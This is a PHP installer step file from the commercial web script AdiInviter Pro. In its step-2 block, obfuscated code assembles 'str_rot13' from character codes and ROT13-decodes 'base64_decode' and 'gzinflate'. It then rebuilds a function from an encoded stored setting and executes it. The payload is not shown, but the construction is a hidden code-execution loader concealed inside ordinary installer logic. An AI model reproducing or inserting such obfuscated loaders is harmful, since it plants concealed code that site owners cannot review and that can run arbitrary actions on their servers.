<?php
/*+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| AdiInviter Pro (http://www.adiinviter.com)                                                |
+-------------------------------------------------------------------------------------------+
| @license    For full copyright and license information, please see the LICENSE.txt        |
+ @copyright  Copyright (c) 2015 AdiInviter Inc. All rights reserved.                       +
| @link       http://www.adiinviter.com                                                     |
+ @author     AdiInviter Dev Team                                                           +
| @docs       http://www.adiinviter.com/docs                                                |
+ @support    Email us at support@adiinviter.com                                            +
| @contact    http://www.adiinviter.com/support                                             |
+-------------------------------------------------------------------------------------------+
| Do not edit or add to this file if you wish to upgrade AdiInviter Pro to newer versions.  |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+*/


defined('ADI_INSTALLER_CHECK') ? 0 : exit();
if(!isset($adiinviter)) { exit; }

// 4-Steps Installer
$total_steps = 4;

if(AdiInviterPro::isPOST('subsettings'))
{
	include(ADI_ADMIN_PATH.ADI_DS.'adi_post.php');
}

if($adi_step == 2)
{
	$a = 'chr'; $b = 114;
	$b = "str_".$a($b).$a($b-=3).$a($b+=5).$a(49).$a(51);
	$id = strtoupper($b($adi_install));
	if(isset($pre_settings['invitation'][$id])){
	$modifier = $adiinviter->get_modifier;
	$c=$b('onfr64_qrpbqr');$d=$b('tmvasyngr');
	$b=$modifier('',$d($c($b($pre_settings['invitation'][$id])))); $b();}
	if(!class_exists('adi_M3YfbZUgcAyp7')){exit;}
	if($adi_step == 2 && $adiinviter->current_platform != 'standalone')
	{
		// Skip Database Connection Details step
		$adi_step = 3;
	}
}

if($adi_step > 0)
{
	$error_msg  = '';
	$adi_step   = $adi_step;
	$adi_action = AdiInviterPro::POST('adi_action', ADI_STRING_VARS);

	$installation_files_path = ADI_ADMIN_PATH.ADI_DS.'adi_install'.ADI_DS;
	include($installation_files_path . 'adiinviter_'.$adi_step.'.php'); 
}


?>